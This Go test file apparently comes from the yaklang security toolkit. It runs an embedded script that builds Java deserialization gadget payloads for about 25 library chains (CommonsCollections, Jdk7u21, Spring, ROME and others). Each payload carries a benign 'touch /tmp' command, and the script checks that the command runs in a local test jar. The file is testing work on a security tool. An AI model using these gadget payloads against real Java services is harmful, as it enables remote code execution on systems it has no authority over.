package yaktest

import (
	"context"
	"github.com/yaklang/yaklang/common/yak/yaklang"
	"testing"
)

var ysoTestCode = `

templateGadgetNames = ["CommonsCollectionsK1","CommonsCollectionsK2","Jdk7u21","CommonsCollections8","MozillaRhino2","JSON1","CommonsBeanutils1","Click1","Spring2","CommonsCollections10","CommonsBeanutils2","CommonsBeanutils1_183","JavassistWeld1","CommonsCollections11","Spring1","CommonsCollections3","Jdk8u20","CommonsCollections2","JBossInterceptors1","MozillaRhino1","ROME","CommonsBeanutils2_183","CommonsCollections4","Hibernate1","Vaadin1"]
extArgsMap = {
	"CommonsBeanutils2_183":"org.apache.commons.beanutils.BeanComparator:cb183",
	"CommonsBeanutils1_183":"org.apache.commons.beanutils.BeanComparator:cb183",
	"Jdk7u21":"sun.reflect.annotation.AnnotationInvocationHandler:AnnotationInvocationHandler_7u21,sun.reflect.annotation.AnnotationInvocationHandler$1:AnnotationInvocationHandler$1_7u21",
	"Jdk8u20":"sun.reflect.annotation.AnnotationInvocationHandler:AnnotationInvocationHandler_8u20,sun.reflect.annotation.AnnotationInvocationHandler$1:AnnotationInvocationHandler$1_8u20,java.beans.beancontext.BeanContextSupport:BeanContextSupport,java.beans.beancontext.BeanContextSupport$1:BeanContextSupport$1,java.beans.beancontext.BeanContextSupport$2:BeanContextSupport$2,java.beans.beancontext.BeanContextSupport$BCSChild:BeanContextSupport$BCSChild,java.beans.beancontext.BeanContextSupport$BCSIterator:BeanContextSupport$BCSIterator",
	"Spring2":"sun.reflect.annotation.AnnotationInvocationHandler:AnnotationInvocationHandler_7u21,sun.reflect.annotation.AnnotationInvocationHandler$1:AnnotationInvocationHandler$1_7u21",
	"Spring1":"sun.reflect.annotation.AnnotationInvocationHandler:AnnotationInvocationHandler_7u21,sun.reflect.annotation.AnnotationInvocationHandler$1:AnnotationInvocationHandler$1_7u21",
	"CommonsCollections3":"sun.reflect.annotation.AnnotationInvocationHandler:AnnotationInvocationHandler_7u21,sun.reflect.annotation.AnnotationInvocationHandler$1:AnnotationInvocationHandler$1_7u21",
}
//templateGadgetNames = ["MozillaRhino1"]
failedGadgets = []
for gadgetName in templateGadgetNames{
	try{
		extArg = ""
		if extArgsMap[gadgetName] != nil{
			extArg = "=/tmp,"+extArgsMap[gadgetName]
		}
		randomstr = str.RandStr(8)
		path = "/tmp/%s" % randomstr
		gadgetIns = yso.GetGadget(gadgetName,yso.useRuntimeExecEvilClass("touch "+path))~
		payload = yso.ToBytes(gadgetIns)~
		payloadBase64 = codec.EncodeBase64(payload)~
		cmd = "/Library/Java/JavaVirtualMachines/zulu-8.jdk/Contents/Home/bin/java '-javaagent:/tmp/yak-yso-tester-loader.jar%s' -jar /tmp/yak-yso-tester.jar '%s'"%[extArg,payloadBase64]
		exec.System(cmd)
		if !file.IsExisted(path){
			panic("not found file")
		}
		file.Remove(path)
		log.info("gadget %s exec test success",gadgetName)
	}catch e{
		log.error("gadget %s exec test failed: %v", gadgetName,e)
		failedGadgets.Append(gadgetName)
	}
}
println("failed gadgets: %s" % str.Join(failedGadgets,","))
`

func TestYsoBaseExternal(t *testing.T) {
	err := yaklang.New().SafeEval(context.Background(), ysoTestCode)
	if err != nil {
		t.Fatal(err)
	}
}
